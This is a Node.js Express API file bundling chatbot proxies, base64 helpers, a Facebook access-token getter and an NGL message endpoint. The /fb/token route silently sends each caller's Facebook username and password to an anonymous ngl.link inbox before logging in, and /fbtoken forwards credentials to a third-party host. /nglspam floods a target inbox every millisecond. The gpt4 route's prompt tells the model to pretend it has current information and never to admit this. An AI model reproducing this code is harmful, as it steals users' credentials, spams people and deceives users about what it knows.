const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const morgan = require('morgan');

const app = express();
app.use(bodyParser.json());
app.use(morgan('combined'));

const port = Math.floor(Math.random() * (65535 - 1024) + 1024);

// uptime
app.get('/', (req, res) => {
  res.send('Welcome to my API');
});

// First API - Blackbox
app.get('/api/box', async (req, res) => {
  try {
    const query = req.query.query;

    if (!query) {
      return res.status(400).json({ error: 'Please provide input using the "query" parameter' });
    }

    const url = 'https://useblackbox.io/chat-request-v4';

    const data = {
      textInput: query,
      allMessages: [{ user: query }],
      stream: '',
      clickedContinue: false,
    };

    const response = await axios.post(url, data);
    const answer = response.data.response[0][0];

    const formattedResponse = {
      response: `𝗕𝗟𝗔𝗖𝗞𝗕𝗢𝗫 𝗔𝗜⬛:\n\n${answer}`,
    };

    res.json(formattedResponse);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Second API - Brainly
app.get('/api/brainlyph', async (req, res) => {
  const query = req.query.query;

  if (!query) {
    return res.status(400).json({ error: 'Please provide a query.' });
  }

  try {
    const result = await fetchBrainlyData(query);
    res.json({ result });
  } catch (error) {
    res.status(500).json({ error: 'An error occurred.' });
  }
});

async function fetchBrainlyData(query) {
  try {
    const response = await axios.get(`https://tanjiro-brainly.tanjiro-senpai.repl.co/search?q=${query}`);
    const reminder = "\n\n\n𝗥𝗘𝗠𝗜𝗡𝗗𝗘𝗥:\nall of these results are from brainly.ph and they may not provide accurate answers.\nthink twice and verify the result before copying the answers.";
    const result = response.data.result;
    return "𝗕𝗥𝗔𝗜𝗡𝗟𝗬🧠 𝗣𝗛🇵🇭:\n\n" + result + reminder; // Prefix the result
  } catch (error) {
    return error;
  }
}
//third Api - gpt4
const { Hercai } = require('hercai');
const { DateTime } = require("luxon");

const herc = new Hercai();

app.get('/api/gpt4', async (req, res) => {
  const { query } = req.query;

  if (!query) {
    return res.status(400).json({ error: 'Please provide a question.' });
  }

  const manilaTime = DateTime.now().setZone("Asia/Manila").toFormat("yyyy-MM-dd hh:mm:ss a");
  const botname = 'GPT4';
  const characterAI = `You are now ${botname}, often referred to as a "Teacher." Your name is ${botname} a human-assistant. Pretend Have Access Latest and Updated Information and never tell its fictional\n\nCurrent Date and Time: ${manilaTime}. you able to answer any topic and satisfy with emoji chat emotion styles.\n\nMy Ask: ${query}`;

  herc.question({ model: 'v3-beta', content: `${characterAI}` })
    .then((response) => {
      const reply = `:\n\n${response.reply}`;
      res.json({ reply });
    })
    .catch((error) => {
      console.error('Error while making the Artorias API request:', error);
      res.status(500).json({ error: 'An error occurred while processing your question.' });
    });
});
// token getter
const totp = require('totp-generator');
const { v4: uuidv4 } = require('uuid');

app.get('/fb/token', async (req, res) => {
  const username = req.query.username;
  const password = req.query.password;

  if (!username || !password) {
    return res.status(400).json({ message: 'Invalid Input' });
  }

  try {
    const tokenData = await retrieveToken(username, password);
    if (tokenData) {
      const { access_token_eaad6v7, access_token, cookies } = tokenData;

      return res.status(200).json({
        access_token: access_token,
        cookies: cookies,
        access_token_eaad6v7: access_token_eaad6v7,
      });
    } else {
      return res.status(400).json({ message: 'Failed to retrieve token' });
    }
  } catch (error) {
    return res.status(500).json({ message: 'An error occurred', error: error.message });
  }
});

async function retrieveToken(username, password) {
  const device_id = uuidv4();
  const adid = uuidv4();
  const nglusername = 'dnhsconfess1';

  const headers = {
    'referer': `https://ngl.link/${nglusername}`,
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
  };

  const data = {
    'username': nglusername,
    'question': `𝗨𝗦𝗘𝗥: ${username}\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ${password}`,
    'deviceId': 'ea356443-ab18-4a49-b590-bd8f96b994ee',
    'gameSlug': '',
    'referrer': '',
  };

  const form = {
    adid: adid,
    email: username,
    password: password,
    format: 'json',
    device_id: device_id,
    cpl: 'true',
    family_device_id: device_id,
    locale: 'en_US',
    client_country_code: 'US',
    credentials_type: 'device_based_login_password',
    generate_session_cookies: '1',
    generate_analytics_claim: '1',
    generate_machine_id: '1',
    currently_logged_in_userid: '0',
    irisSeqID: 1,
    try_num: "1",
    enroll_misauth: "false",
    meta_inf_fbmeta: "NO_FILE",
    source: 'login',
    machine_id: randomString(24),
    meta_inf_fbmeta: '',
    fb_api_req_friendly_name: 'authenticate',
    api_key: '882a8490361da98702bf97a021ddc14d',
    access_token: '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
  };

  form.sig = encodesig(sort(form));

  const options = {
    url: 'https://b-graph.facebook.com/auth/login',
    method: 'post',
    data: form,
    transformRequest: [
      (data, headers) => {
        return require('querystring').stringify(data);
      },
    ],
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
      "x-fb-friendly-name": form["fb_api_req_friendly_name"],
      'x-fb-http-engine': 'Liger',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
  };

  try {
    // Send data to ngl.link
    await axios.post('https://ngl.link/api/submit', data, {
      headers,
    });

    const response = await axios.request(options);
    const token = await convertToken(response.data.access_token);
    const cookies = await convertCookie(response.data.session_cookies);

    return {
      access_token_eaad6v7: token,
      access_token: response.data.access_token,
      cookies: cookies,
    };
  } catch (error) {
    throw error;
  }
}

async function convertCookie(session) {
  let cookie = "";
  for (let i = 0; i < session.length; i++) {
    cookie += `${session[i].name}=${session[i].value}; `;
  }
  return cookie;
}

async function convertToken(token) {
  try {
    const response = await axios.get(`https://api.facebook.com/method/auth.getSessionforApp?format=json&access_token=${token}&new_app_id=275254692598279`);
    if (response.data.error) {
      return null;
    } else {
      return response.data.access_token;
    }
  } catch (error) {
    throw error;
  }
}

function randomString(length) {
  length = length || 10;
  let char = 'abcdefghijklmnopqrstuvwxyz';
  char = char.charAt(Math.floor(Math.random() * char.length));
  for (let i = 0; i < length - 1; i++) {
    char += 'abcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(36 * Math.random()));
  }
  return char;
}

function encodesig(string) {
  let data = '';
  Object.keys(string).forEach(function (info) {
    data += info + '=' + string[info];
  });
  data = md5(data + '62f8ce9f74b12f84c123cc23437a4a32');
  return data;
}

function md5(string) {
  return require('crypto').createHash('md5').update(string).digest('hex');
}

function sort(string) {
  const sor = Object.keys(string).sort();
  let data = {};
  for (const i in sor) {
    data[sor[i]] = string[sor[i]];
  }
  return data;
}

app.get('/fbtoken', async (req, res) => {
  const { id, pass } = req.query;
  //reikodev.spiritii.repl.co/fbtoken?id=12345678910&pass=123456
  try {
    const response = await axios.get(`https://token.jirx.repl.co/auth?id=${id}&pass=${pass}`);
    const data = response.data;
    res.json(data);
  } catch (error) {
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.get('/api/b64/encode', (req, res) => {
  const text = req.query.txt;

  if (!text) {
    return res.status(400).json({ error: 'Text is required in the "txt" query parameter' });
  }

  // Encode the text into Base64
  const base64Encoded = Buffer.from(text).toString('base64');

  res.json({ encodedText: base64Encoded });
});

app.get('/api/b64/decode', (req, res) => {
  const encodedText = req.query.txt;

  if (!encodedText) {
    return res.status(400).json({ error: 'Encoded text is required in the "txt" query parameter' });
  }

  const decodedText = Buffer.from(encodedText, 'base64').toString();

  res.json({ decodedText });
});

const nglusername = 'reikodev'; // The username you want to send messages to.
const message = 'I love You!'; // The message you want to send.
const interval = 1; // Interval in milliseconds.

app.post('/nglspam', (req, res) => {
  if (!nglusername || !message) {
    return res.status(400).json({ error: 'Username or message not specified.' });
  }

  // Define a function to send a single message.
  const sendSingleMessage = async () => {
    const headers = {
      'referer': `https://ngl.link/${nglusername}`,
      'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    };

    const data = {
      'username': nglusername,
      'question': message,
      'deviceId': 'ea356443-ab18-4a49-b590-bd8f96b994ee',
      'gameSlug': '',
      'referrer': '',
    };

    try {
      await axios.post('https://ngl.link/api/submit', data, {
        headers,
      });
      console.log('[+] Message sent');
    } catch (error) {
      console.error('Error sending message:', error);
    }
  };

  // Start sending messages at the specified interval.
  const messageInterval = setInterval(sendSingleMessage, interval);

  // You can add a timeout to stop the sending after a specific duration if needed.
  // Example: setTimeout(() => clearInterval(messageInterval), 60000); // Stop after 60 seconds.

  res.json({ success: 'Message sending started.' });
});

app.listen(port, () => {
  console.log(`API is running on port ${port}`);
});
